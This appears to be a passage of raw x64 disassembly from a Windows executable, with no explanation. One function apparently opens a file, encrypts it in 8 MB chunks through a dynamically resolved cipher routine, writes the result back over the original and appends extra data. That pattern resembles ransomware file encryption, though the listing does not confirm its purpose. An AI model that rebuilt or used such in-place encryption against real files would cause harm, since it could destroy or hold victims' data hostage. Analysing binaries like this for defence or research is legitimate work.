   140002b01:	0f 11 02             	movups %xmm0,(%rdx)
   140002b04:	e8 73 df 00 00       	call   0x140010a7c
   140002b09:	48 8d 05 e8 d9 02 00 	lea    0x2d9e8(%rip),%rax        # 0x1400304f8
   140002b10:	48 89 03             	mov    %rax,(%rbx)
   140002b13:	48 8b c3             	mov    %rbx,%rax
   140002b16:	48 83 c4 20          	add    $0x20,%rsp
   140002b1a:	5b                   	pop    %rbx
   140002b1b:	c3                   	ret
   140002b1c:	cc                   	int3
   140002b1d:	cc                   	int3
   140002b1e:	cc                   	int3
   140002b1f:	cc                   	int3
   140002b20:	40 53                	rex push %rbx
   140002b22:	56                   	push   %rsi
   140002b23:	57                   	push   %rdi
   140002b24:	41 56                	push   %r14
   140002b26:	41 57                	push   %r15
   140002b28:	48 83 ec 70          	sub    $0x70,%rsp
   140002b2c:	48 8b 05 0d 05 04 00 	mov    0x4050d(%rip),%rax        # 0x140043040
   140002b33:	48 33 c4             	xor    %rsp,%rax
   140002b36:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140002b3b:	4d 8b f1             	mov    %r9,%r14
   140002b3e:	49 8b f8             	mov    %r8,%rdi
   140002b41:	48 8b da             	mov    %rdx,%rbx
   140002b44:	4c 8b f9             	mov    %rcx,%r15
   140002b47:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140002b4c:	4c 89 4c 24 50       	mov    %r9,0x50(%rsp)
   140002b51:	48 8b b4 24 c0 00 00 	mov    0xc0(%rsp),%rsi
   140002b58:	00 
   140002b59:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   140002b5e:	48 8d 0d 3b 8b 03 00 	lea    0x38b3b(%rip),%rcx        # 0x14003b6a0
   140002b65:	ff 15 f5 d4 02 00    	call   *0x2d4f5(%rip)        # 0x140030060
   140002b6b:	0f 28 03             	movaps (%rbx),%xmm0
   140002b6e:	0f 29 44 24 20       	movaps %xmm0,0x20(%rsp)
   140002b73:	0f 28 4b 10          	movaps 0x10(%rbx),%xmm1
   140002b77:	0f 29 4c 24 30       	movaps %xmm1,0x30(%rsp)
   140002b7c:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140002b81:	48 8b d0             	mov    %rax,%rdx
   140002b84:	49 8b cf             	mov    %r15,%rcx
   140002b87:	e8 24 fc ff ff       	call   0x1400027b0
   140002b8c:	90                   	nop
   140002b8d:	48 8d 05 44 9b 03 00 	lea    0x39b44(%rip),%rax        # 0x14003c6d8
   140002b94:	49 89 07             	mov    %rax,(%r15)
   140002b97:	0f 28 07             	movaps (%rdi),%xmm0
   140002b9a:	41 0f 11 47 30       	movups %xmm0,0x30(%r15)
   140002b9f:	49 8d 4f 40          	lea    0x40(%r15),%rcx
   140002ba3:	49 8b d6             	mov    %r14,%rdx
   140002ba6:	e8 55 30 00 00       	call   0x140005c00
   140002bab:	90                   	nop
   140002bac:	49 8d 4f 60          	lea    0x60(%r15),%rcx
   140002bb0:	48 8b d6             	mov    %rsi,%rdx
   140002bb3:	e8 48 30 00 00       	call   0x140005c00
   140002bb8:	90                   	nop
   140002bb9:	41 f6 46 10 0f       	testb  $0xf,0x10(%r14)
   140002bbe:	0f 85 b4 00 00 00    	jne    0x140002c78
   140002bc4:	49 8b 56 18          	mov    0x18(%r14),%rdx
   140002bc8:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002bcc:	76 2c                	jbe    0x140002bfa
   140002bce:	49 8b 0e             	mov    (%r14),%rcx
   140002bd1:	48 ff c2             	inc    %rdx
   140002bd4:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002bdb:	72 18                	jb     0x140002bf5
   140002bdd:	48 83 c2 27          	add    $0x27,%rdx
   140002be1:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   140002be5:	49 2b c8             	sub    %r8,%rcx
   140002be8:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   140002bec:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002bf0:	77 7a                	ja     0x140002c6c
   140002bf2:	49 8b c8             	mov    %r8,%rcx
   140002bf5:	e8 26 c2 00 00       	call   0x14000ee20
   140002bfa:	33 db                	xor    %ebx,%ebx
   140002bfc:	49 89 5e 10          	mov    %rbx,0x10(%r14)
   140002c00:	49 c7 46 18 0f 00 00 	movq   $0xf,0x18(%r14)
   140002c07:	00 
   140002c08:	41 88 1e             	mov    %bl,(%r14)
   140002c0b:	48 8b 56 18          	mov    0x18(%rsi),%rdx
   140002c0f:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002c13:	76 2c                	jbe    0x140002c41
   140002c15:	48 ff c2             	inc    %rdx
   140002c18:	48 8b 0e             	mov    (%rsi),%rcx
   140002c1b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002c22:	72 18                	jb     0x140002c3c
   140002c24:	48 83 c2 27          	add    $0x27,%rdx
   140002c28:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   140002c2c:	49 2b c8             	sub    %r8,%rcx
   140002c2f:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   140002c33:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002c37:	77 39                	ja     0x140002c72
   140002c39:	49 8b c8             	mov    %r8,%rcx
   140002c3c:	e8 df c1 00 00       	call   0x14000ee20
   140002c41:	48 89 5e 10          	mov    %rbx,0x10(%rsi)
   140002c45:	48 c7 46 18 0f 00 00 	movq   $0xf,0x18(%rsi)
   140002c4c:	00 
   140002c4d:	c6 06 00             	movb   $0x0,(%rsi)
   140002c50:	49 8b c7             	mov    %r15,%rax
   140002c53:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140002c58:	48 33 cc             	xor    %rsp,%rcx
   140002c5b:	e8 a0 c1 00 00       	call   0x14000ee00
   140002c60:	48 83 c4 70          	add    $0x70,%rsp
   140002c64:	41 5f                	pop    %r15
   140002c66:	41 5e                	pop    %r14
   140002c68:	5f                   	pop    %rdi
   140002c69:	5e                   	pop    %rsi
   140002c6a:	5b                   	pop    %rbx
   140002c6b:	c3                   	ret
   140002c6c:	e8 23 45 01 00       	call   0x140017194
   140002c71:	90                   	nop
   140002c72:	e8 1d 45 01 00       	call   0x140017194
   140002c77:	90                   	nop
   140002c78:	48 8d 15 31 8a 03 00 	lea    0x38a31(%rip),%rdx        # 0x14003b6b0
   140002c7f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002c84:	e8 57 e9 ff ff       	call   0x1400015e0
   140002c89:	48 8d 15 e8 ea 03 00 	lea    0x3eae8(%rip),%rdx        # 0x140041778
   140002c90:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002c95:	e8 26 e0 00 00       	call   0x140010cc0
   140002c9a:	cc                   	int3
   140002c9b:	cc                   	int3
   140002c9c:	cc                   	int3
   140002c9d:	cc                   	int3
   140002c9e:	cc                   	int3
   140002c9f:	cc                   	int3
   140002ca0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002ca5:	55                   	push   %rbp
   140002ca6:	56                   	push   %rsi
   140002ca7:	57                   	push   %rdi
   140002ca8:	41 54                	push   %r12
   140002caa:	41 55                	push   %r13
   140002cac:	41 56                	push   %r14
   140002cae:	41 57                	push   %r15
   140002cb0:	48 8d 6c 24 d9       	lea    -0x27(%rsp),%rbp
   140002cb5:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   140002cbc:	48 8b 05 7d 03 04 00 	mov    0x4037d(%rip),%rax        # 0x140043040
   140002cc3:	48 33 c4             	xor    %rsp,%rax
   140002cc6:	48 89 45 1f          	mov    %rax,0x1f(%rbp)
   140002cca:	48 8b c2             	mov    %rdx,%rax
   140002ccd:	4c 8b e9             	mov    %rcx,%r13
   140002cd0:	48 83 7a 18 07       	cmpq   $0x7,0x18(%rdx)
   140002cd5:	76 03                	jbe    0x140002cda
   140002cd7:	48 8b 02             	mov    (%rdx),%rax
   140002cda:	45 33 f6             	xor    %r14d,%r14d
   140002cdd:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140002ce2:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140002ce9:	00 
   140002cea:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   140002cf1:	00 
   140002cf2:	45 33 c9             	xor    %r9d,%r9d
   140002cf5:	45 33 c0             	xor    %r8d,%r8d
   140002cf8:	ba 00 00 00 c0       	mov    $0xc0000000,%edx
   140002cfd:	48 8b c8             	mov    %rax,%rcx
   140002d00:	ff 15 42 d3 02 00    	call   *0x2d342(%rip)        # 0x140030048
   140002d06:	4c 8b f8             	mov    %rax,%r15
   140002d09:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140002d0d:	74 1a                	je     0x140002d29
   140002d0f:	48 8d 55 f7          	lea    -0x9(%rbp),%rdx
   140002d13:	48 8b c8             	mov    %rax,%rcx
   140002d16:	ff 15 f4 d2 02 00    	call   *0x2d2f4(%rip)        # 0x140030010
   140002d1c:	85 c0                	test   %eax,%eax
   140002d1e:	75 10                	jne    0x140002d30
   140002d20:	49 8b cf             	mov    %r15,%rcx
   140002d23:	ff 15 3f d3 02 00    	call   *0x2d33f(%rip)        # 0x140030068
   140002d29:	32 c0                	xor    %al,%al
   140002d2b:	e9 1e 04 00 00       	jmp    0x14000314e
   140002d30:	48 8b 75 f7          	mov    -0x9(%rbp),%rsi
   140002d34:	44 8b e6             	mov    %esi,%r12d
   140002d37:	41 c1 ec 17          	shr    $0x17,%r12d
   140002d3b:	44 89 65 e3          	mov    %r12d,-0x1d(%rbp)
   140002d3f:	81 e6 ff ff 7f 00    	and    $0x7fffff,%esi
   140002d45:	b9 00 00 80 00       	mov    $0x800000,%ecx
   140002d4a:	e8 1d c1 00 00       	call   0x14000ee6c
   140002d4f:	48 8b d8             	mov    %rax,%rbx
   140002d52:	48 89 45 ff          	mov    %rax,-0x1(%rbp)
   140002d56:	b9 00 00 80 00       	mov    $0x800000,%ecx
   140002d5b:	e8 0c c1 00 00       	call   0x14000ee6c
   140002d60:	48 8b f8             	mov    %rax,%rdi
   140002d63:	48 89 45 07          	mov    %rax,0x7(%rbp)
   140002d67:	49 8d 55 40          	lea    0x40(%r13),%rdx
   140002d6b:	48 83 7a 18 0f       	cmpq   $0xf,0x18(%rdx)
   140002d70:	76 0c                	jbe    0x140002d7e
   140002d72:	4c 8b 02             	mov    (%rdx),%r8
   140002d75:	4c 03 42 10          	add    0x10(%rdx),%r8
   140002d79:	48 8b 12             	mov    (%rdx),%rdx
   140002d7c:	eb 07                	jmp    0x140002d85
   140002d7e:	4c 8b 42 10          	mov    0x10(%rdx),%r8
   140002d82:	4c 03 c2             	add    %rdx,%r8
   140002d85:	4c 2b c2             	sub    %rdx,%r8
   140002d88:	48 8b c8             	mov    %rax,%rcx
   140002d8b:	e8 40 b2 02 00       	call   0x14002dfd0
   140002d90:	49 8b 45 50          	mov    0x50(%r13),%rax
   140002d94:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   140002d98:	66 0f 6f 05 30 9b 03 	movdqa 0x39b30(%rip),%xmm0        # 0x14003c8d0
   140002d9f:	00 
   140002da0:	0f 11 45 0f          	movups %xmm0,0xf(%rbp)
   140002da4:	45 33 c9             	xor    %r9d,%r9d
   140002da7:	45 33 c0             	xor    %r8d,%r8d
   140002daa:	33 d2                	xor    %edx,%edx
   140002dac:	49 8b cf             	mov    %r15,%rcx
   140002daf:	ff 15 7b d2 02 00    	call   *0x2d27b(%rip)        # 0x140030030
   140002db5:	44 89 75 df          	mov    %r14d,-0x21(%rbp)
   140002db9:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140002dbe:	4c 8d 4d df          	lea    -0x21(%rbp),%r9
   140002dc2:	41 b8 00 00 80 00    	mov    $0x800000,%r8d
   140002dc8:	48 8b d3             	mov    %rbx,%rdx
   140002dcb:	49 8b cf             	mov    %r15,%rcx
   140002dce:	ff 15 2c d2 02 00    	call   *0x2d22c(%rip)        # 0x140030000
   140002dd4:	85 c0                	test   %eax,%eax
   140002dd6:	0f 84 39 03 00 00    	je     0x140003115
   140002ddc:	8b 45 df             	mov    -0x21(%rbp),%eax
   140002ddf:	48 89 45 cf          	mov    %rax,-0x31(%rbp)
   140002de3:	45 85 e4             	test   %r12d,%r12d
   140002de6:	0f 84 fc 01 00 00    	je     0x140002fe8
   140002dec:	33 c0                	xor    %eax,%eax
   140002dee:	44 8b e0             	mov    %eax,%r12d
   140002df1:	48 8d 15 e0 86 03 00 	lea    0x386e0(%rip),%rdx        # 0x14003b4d8
   140002df8:	49 8b 4d 28          	mov    0x28(%r13),%rcx
   140002dfc:	ff 15 76 d2 02 00    	call   *0x2d276(%rip)        # 0x140030078
   140002e02:	33 c9                	xor    %ecx,%ecx
   140002e04:	89 4d ef             	mov    %ecx,-0x11(%rbp)
   140002e07:	89 4c 24 48          	mov    %ecx,0x48(%rsp)
   140002e0b:	48 8d 4d ef          	lea    -0x11(%rbp),%rcx
   140002e0f:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140002e14:	48 8b 4d cf          	mov    -0x31(%rbp),%rcx
   140002e18:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   140002e1c:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140002e21:	c7 44 24 28 10 00 00 	movl   $0x10,0x28(%rsp)
   140002e28:	00 
   140002e29:	49 8d 55 30          	lea    0x30(%r13),%rdx
   140002e2d:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140002e32:	45 33 c9             	xor    %r9d,%r9d
   140002e35:	44 8b c1             	mov    %ecx,%r8d
   140002e38:	48 8b d3             	mov    %rbx,%rdx
   140002e3b:	49 8b 4d 10          	mov    0x10(%r13),%rcx
   140002e3f:	ff d0                	call   *%rax
   140002e41:	85 c0                	test   %eax,%eax
   140002e43:	0f 85 cc 02 00 00    	jne    0x140003115
   140002e49:	33 c9                	xor    %ecx,%ecx
   140002e4b:	89 4d e7             	mov    %ecx,-0x19(%rbp)
   140002e4e:	41 8b 55 50          	mov    0x50(%r13),%edx
   140002e52:	81 c2 00 00 80 ff    	add    $0xff800000,%edx
   140002e58:	41 03 d4             	add    %r12d,%edx
   140002e5b:	85 d2                	test   %edx,%edx
   140002e5d:	0f 4e d1             	cmovle %ecx,%edx
   140002e60:	45 33 c9             	xor    %r9d,%r9d
   140002e63:	45 33 c0             	xor    %r8d,%r8d
   140002e66:	49 8b cf             	mov    %r15,%rcx
   140002e69:	ff 15 c1 d1 02 00    	call   *0x2d1c1(%rip)        # 0x140030030
   140002e6f:	33 c0                	xor    %eax,%eax
   140002e71:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002e76:	4c 8d 4d e7          	lea    -0x19(%rbp),%r9
   140002e7a:	44 8b 45 c7          	mov    -0x39(%rbp),%r8d
   140002e7e:	48 8b d7             	mov    %rdi,%rdx
   140002e81:	49 8b cf             	mov    %r15,%rcx
   140002e84:	ff 15 96 d1 02 00    	call   *0x2d196(%rip)        # 0x140030020
   140002e8a:	85 c0                	test   %eax,%eax
   140002e8c:	0f 84 83 02 00 00    	je     0x140003115
   140002e92:	41 8d 94 24 00 00 80 	lea    0x800000(%r12),%edx
   140002e99:	00 
   140002e9a:	45 33 c9             	xor    %r9d,%r9d
   140002e9d:	45 33 c0             	xor    %r8d,%r8d
   140002ea0:	49 8b cf             	mov    %r15,%rcx
   140002ea3:	ff 15 87 d1 02 00    	call   *0x2d187(%rip)        # 0x140030030
   140002ea9:	33 c0                	xor    %eax,%eax
   140002eab:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002eb0:	4c 8d 4d df          	lea    -0x21(%rbp),%r9
   140002eb4:	41 b8 00 00 80 00    	mov    $0x800000,%r8d
   140002eba:	48 8b d7             	mov    %rdi,%rdx
   140002ebd:	49 8b cf             	mov    %r15,%rcx
   140002ec0:	ff 15 3a d1 02 00    	call   *0x2d13a(%rip)        # 0x140030000
   140002ec6:	85 c0                	test   %eax,%eax
   140002ec8:	0f 84 47 02 00 00    	je     0x140003115
   140002ece:	48 8b c3             	mov    %rbx,%rax
   140002ed1:	48 8b df             	mov    %rdi,%rbx
   140002ed4:	48 89 5d ff          	mov    %rbx,-0x1(%rbp)
   140002ed8:	48 8b f8             	mov    %rax,%rdi
   140002edb:	48 89 45 07          	mov    %rax,0x7(%rbp)
   140002edf:	48 8b 45 cf          	mov    -0x31(%rbp),%rax
   140002ee3:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   140002ee7:	8b 45 df             	mov    -0x21(%rbp),%eax
   140002eea:	48 89 45 cf          	mov    %rax,-0x31(%rbp)
   140002eee:	8b 4d e3             	mov    -0x1d(%rbp),%ecx
   140002ef1:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140002ef4:	44 3b f0             	cmp    %eax,%r14d
   140002ef7:	0f 85 d4 00 00 00    	jne    0x140002fd1
   140002efd:	85 f6                	test   %esi,%esi
   140002eff:	0f 85 cc 00 00 00    	jne    0x140002fd1
   140002f05:	c1 e1 17             	shl    $0x17,%ecx
   140002f08:	41 8b 55 50          	mov    0x50(%r13),%edx
   140002f0c:	81 c1 00 00 80 ff    	add    $0xff800000,%ecx
   140002f12:	03 d1                	add    %ecx,%edx
   140002f14:	85 d2                	test   %edx,%edx
   140002f16:	b8 00 00 00 00       	mov    $0x0,%eax
   140002f1b:	0f 4e d0             	cmovle %eax,%edx
   140002f1e:	45 33 c9             	xor    %r9d,%r9d
   140002f21:	45 33 c0             	xor    %r8d,%r8d
   140002f24:	49 8b cf             	mov    %r15,%rcx
   140002f27:	ff 15 03 d1 02 00    	call   *0x2d103(%rip)        # 0x140030030
   140002f2d:	33 c0                	xor    %eax,%eax
   140002f2f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002f34:	4c 8d 4d e7          	lea    -0x19(%rbp),%r9
   140002f38:	44 8b 45 c7          	mov    -0x39(%rbp),%r8d
   140002f3c:	48 8b d7             	mov    %rdi,%rdx
   140002f3f:	49 8b cf             	mov    %r15,%rcx
   140002f42:	ff 15 d8 d0 02 00    	call   *0x2d0d8(%rip)        # 0x140030020
   140002f48:	85 c0                	test   %eax,%eax
   140002f4a:	0f 84 c5 01 00 00    	je     0x140003115
   140002f50:	48 8d 15 81 85 03 00 	lea    0x38581(%rip),%rdx        # 0x14003b4d8
   140002f57:	49 8b 4d 28          	mov    0x28(%r13),%rcx
   140002f5b:	ff 15 17 d1 02 00    	call   *0x2d117(%rip)        # 0x140030078
   140002f61:	33 c9                	xor    %ecx,%ecx
   140002f63:	89 4d eb             	mov    %ecx,-0x15(%rbp)
   140002f66:	89 4c 24 48          	mov    %ecx,0x48(%rsp)
   140002f6a:	48 8d 4d eb          	lea    -0x15(%rbp),%rcx
   140002f6e:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140002f73:	c7 44 24 38 10 00 00 	movl   $0x10,0x38(%rsp)
   140002f7a:	00 
   140002f7b:	48 8d 4d 0f          	lea    0xf(%rbp),%rcx
   140002f7f:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140002f84:	c7 44 24 28 10 00 00 	movl   $0x10,0x28(%rsp)
   140002f8b:	00 
   140002f8c:	49 8d 4d 30          	lea    0x30(%r13),%rcx
   140002f90:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140002f95:	45 33 c9             	xor    %r9d,%r9d
   140002f98:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140002f9e:	48 8d 55 0f          	lea    0xf(%rbp),%rdx
   140002fa2:	49 8b 4d 10          	mov    0x10(%r13),%rcx
   140002fa6:	ff d0                	call   *%rax
   140002fa8:	33 c0                	xor    %eax,%eax
   140002faa:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002faf:	4c 8d 4d e7          	lea    -0x19(%rbp),%r9
   140002fb3:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140002fb9:	48 8d 55 0f          	lea    0xf(%rbp),%rdx
   140002fbd:	49 8b cf             	mov    %r15,%rcx
   140002fc0:	ff 15 5a d0 02 00    	call   *0x2d05a(%rip)        # 0x140030020
   140002fc6:	85 c0                	test   %eax,%eax
   140002fc8:	0f 84 47 01 00 00    	je     0x140003115
   140002fce:	8b 4d e3             	mov    -0x1d(%rbp),%ecx
   140002fd1:	41 ff c6             	inc    %r14d
   140002fd4:	41 81 c4 00 00 80 00 	add    $0x800000,%r12d
   140002fdb:	44 3b f1             	cmp    %ecx,%r14d
   140002fde:	0f 82 0d fe ff ff    	jb     0x140002df1
   140002fe4:	44 8b 65 e3          	mov    -0x1d(%rbp),%r12d
   140002fe8:	85 f6                	test   %esi,%esi
   140002fea:	0f 84 fc 00 00 00    	je     0x1400030ec
   140002ff0:	8b 4d df             	mov    -0x21(%rbp),%ecx
   140002ff3:	44 8b c6             	mov    %esi,%r8d
   140002ff6:	41 83 e0 f0          	and    $0xfffffff0,%r8d
   140002ffa:	41 83 c0 10          	add    $0x10,%r8d
   140002ffe:	49 3b c8             	cmp    %r8,%rcx
   140003001:	73 1a                	jae    0x14000301d
   140003003:	45 0f b6 c8          	movzbl %r8b,%r9d
   140003007:	44 2a c9             	sub    %cl,%r9b
   14000300a:	8b c1                	mov    %ecx,%eax
   14000300c:	0f 1f 40 00          	nopl   0x0(%rax)
   140003010:	44 88 0c 18          	mov    %r9b,(%rax,%rbx,1)
   140003014:	ff c1                	inc    %ecx
   140003016:	8b c1                	mov    %ecx,%eax
   140003018:	49 3b c0             	cmp    %r8,%rax
   14000301b:	72 f3                	jb     0x140003010
   14000301d:	4d 8d 75 30          	lea    0x30(%r13),%r14
   140003021:	83 e6 f0             	and    $0xfffffff0,%esi
   140003024:	83 c6 10             	add    $0x10,%esi
   140003027:	48 8d 15 aa 84 03 00 	lea    0x384aa(%rip),%rdx        # 0x14003b4d8
   14000302e:	49 8b 4d 28          	mov    0x28(%r13),%rcx
   140003032:	ff 15 40 d0 02 00    	call   *0x2d040(%rip)        # 0x140030078
   140003038:	33 c9                	xor    %ecx,%ecx
   14000303a:	89 4d eb             	mov    %ecx,-0x15(%rbp)
   14000303d:	89 4c 24 48          	mov    %ecx,0x48(%rsp)
   140003041:	48 8d 4d eb          	lea    -0x15(%rbp),%rcx
   140003045:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   14000304a:	89 74 24 38          	mov    %esi,0x38(%rsp)
   14000304e:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140003053:	c7 44 24 28 10 00 00 	movl   $0x10,0x28(%rsp)
   14000305a:	00 
   14000305b:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140003060:	45 33 c9             	xor    %r9d,%r9d
   140003063:	44 8b c6             	mov    %esi,%r8d
   140003066:	48 8b d3             	mov    %rbx,%rdx
   140003069:	49 8b 4d 10          	mov    0x10(%r13),%rcx
   14000306d:	ff d0                	call   *%rax
   14000306f:	41 c1 e4 17          	shl    $0x17,%r12d
   140003073:	41 8b 55 50          	mov    0x50(%r13),%edx
   140003077:	81 c2 00 00 80 ff    	add    $0xff800000,%edx
   14000307d:	41 03 d4             	add    %r12d,%edx
   140003080:	85 d2                	test   %edx,%edx
   140003082:	be 00 00 00 00       	mov    $0x0,%esi
   140003087:	0f 4e d6             	cmovle %esi,%edx
   14000308a:	45 33 c9             	xor    %r9d,%r9d
   14000308d:	45 33 c0             	xor    %r8d,%r8d
   140003090:	49 8b cf             	mov    %r15,%rcx
   140003093:	ff 15 97 cf 02 00    	call   *0x2cf97(%rip)        # 0x140030030
   140003099:	89 75 e3             	mov    %esi,-0x1d(%rbp)
   14000309c:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400030a1:	4c 8d 4d e3          	lea    -0x1d(%rbp),%r9
   1400030a5:	44 8b 45 c7          	mov    -0x39(%rbp),%r8d
   1400030a9:	48 8b d7             	mov    %rdi,%rdx
   1400030ac:	49 8b cf             	mov    %r15,%rcx
   1400030af:	ff 15 6b cf 02 00    	call   *0x2cf6b(%rip)        # 0x140030020
   1400030b5:	49 8b cf             	mov    %r15,%rcx
   1400030b8:	85 c0                	test   %eax,%eax
   1400030ba:	74 5c                	je     0x140003118
   1400030bc:	44 8b 45 df          	mov    -0x21(%rbp),%r8d
   1400030c0:	41 c1 e8 04          	shr    $0x4,%r8d
   1400030c4:	41 ff c0             	inc    %r8d
   1400030c7:	41 c1 e0 04          	shl    $0x4,%r8d
   1400030cb:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400030d0:	4c 8d 4d e3          	lea    -0x1d(%rbp),%r9
   1400030d4:	48 8b d3             	mov    %rbx,%rdx
   1400030d7:	ff 15 43 cf 02 00    	call   *0x2cf43(%rip)        # 0x140030020
   1400030dd:	85 c0                	test   %eax,%eax
   1400030df:	75 0d                	jne    0x1400030ee
   1400030e1:	49 8b cf             	mov    %r15,%rcx
   1400030e4:	ff 15 7e cf 02 00    	call   *0x2cf7e(%rip)        # 0x140030068
   1400030ea:	eb 43                	jmp    0x14000312f
   1400030ec:	33 f6                	xor    %esi,%esi
   1400030ee:	49 8d 55 60          	lea    0x60(%r13),%rdx
   1400030f2:	48 83 7a 18 0f       	cmpq   $0xf,0x18(%rdx)
   1400030f7:	76 03                	jbe    0x1400030fc
   1400030f9:	48 8b 12             	mov    (%rdx),%rdx
   1400030fc:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003101:	45 33 c9             	xor    %r9d,%r9d
   140003104:	45 8b 45 70          	mov    0x70(%r13),%r8d
   140003108:	49 8b cf             	mov    %r15,%rcx
   14000310b:	ff 15 0f cf 02 00    	call   *0x2cf0f(%rip)        # 0x140030020
   140003111:	85 c0                	test   %eax,%eax
   140003113:	75 0e                	jne    0x140003123
   140003115:	49 8b cf             	mov    %r15,%rcx
   140003118:	ff 15 4a cf 02 00    	call   *0x2cf4a(%rip)        # 0x140030068
   14000311e:	40 32 f6             	xor    %sil,%sil
   140003121:	eb 0c                	jmp    0x14000312f
   140003123:	49 8b cf             	mov    %r15,%rcx
   140003126:	ff 15 3c cf 02 00    	call   *0x2cf3c(%rip)        # 0x140030068
   14000312c:	40 b6 01             	mov    $0x1,%sil
   14000312f:	48 85 ff             	test   %rdi,%rdi
   140003132:	74 09                	je     0x14000313d
   140003134:	48 8b cf             	mov    %rdi,%rcx
   140003137:	e8 e4 bc 00 00       	call   0x14000ee20
   14000313c:	90                   	nop
   14000313d:	48 85 db             	test   %rbx,%rbx
   140003140:	74 08                	je     0x14000314a
   140003142:	48 8b cb             	mov    %rbx,%rcx
   140003145:	e8 d6 bc 00 00       	call   0x14000ee20
   14000314a:	40 0f b6 c6          	movzbl %sil,%eax
   14000314e:	48 8b 4d 1f          	mov    0x1f(%rbp),%rcx
   140003152:	48 33 cc             	xor    %rsp,%rcx
   140003155:	e8 a6 bc 00 00       	call   0x14000ee00
   14000315a:	48 8b 9c 24 00 01 00 	mov    0x100(%rsp),%rbx
   140003161:	00 
   140003162:	48 81 c4 b0 00 00 00 	add    $0xb0,%rsp
   140003169:	41 5f                	pop    %r15
   14000316b:	41 5e                	pop    %r14
   14000316d:	41 5d                	pop    %r13
   14000316f:	41 5c                	pop    %r12
   140003171:	5f                   	pop    %rdi
   140003172:	5e                   	pop    %rsi
   140003173:	5d                   	pop    %rbp
   140003174:	c3                   	ret
   140003175:	cc                   	int3
   140003176:	cc                   	int3
   140003177:	cc                   	int3
   140003178:	cc                   	int3
   140003179:	cc                   	int3
   14000317a:	cc                   	int3
   14000317b:	cc                   	int3
   14000317c:	cc                   	int3
   14000317d:	cc                   	int3
   14000317e:	cc                   	int3
   14000317f:	cc                   	int3
   140003180:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140003185:	55                   	push   %rbp
   140003186:	56                   	push   %rsi
   140003187:	57                   	push   %rdi
   140003188:	41 54                	push   %r12
   14000318a:	41 55                	push   %r13
   14000318c:	41 56                	push   %r14
   14000318e:	41 57                	push   %r15
   140003190:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140003197:	48 8b 05 a2 fe 03 00 	mov    0x3fea2(%rip),%rax        # 0x140043040
   14000319e:	48 33 c4             	xor    %rsp,%rax
   1400031a1:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   1400031a8:	00 
   1400031a9:	48 8b c2             	mov    %rdx,%rax
   1400031ac:	48 8b f9             	mov    %rcx,%rdi
   1400031af:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   1400031b4:	48 83 7a 18 07       	cmpq   $0x7,0x18(%rdx)
   1400031b9:	76 03                	jbe    0x1400031be
   1400031bb:	48 8b 02             	mov    (%rdx),%rax
   1400031be:	45 33 e4             	xor    %r12d,%r12d
   1400031c1:	4c 89 64 24 30       	mov    %r12,0x30(%rsp)
   1400031c6:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   1400031cd:	00 
   1400031ce:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   1400031d5:	00 
   1400031d6:	45 33 c9             	xor    %r9d,%r9d
   1400031d9:	45 33 c0             	xor    %r8d,%r8d
   1400031dc:	ba 00 00 00 c0       	mov    $0xc0000000,%edx
   1400031e1:	48 8b c8             	mov    %rax,%rcx
   1400031e4:	ff 15 5e ce 02 00    	call   *0x2ce5e(%rip)        # 0x140030048
   1400031ea:	48 8b f0             	mov    %rax,%rsi
   1400031ed:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400031f1:	74 1b                	je     0x14000320e
   1400031f3:	48 8d 54 24 68       	lea    0x68(%rsp),%rdx
   1400031f8:	48 8b c8             	mov    %rax,%rcx
   1400031fb:	ff 15 0f ce 02 00    	call   *0x2ce0f(%rip)        # 0x140030010
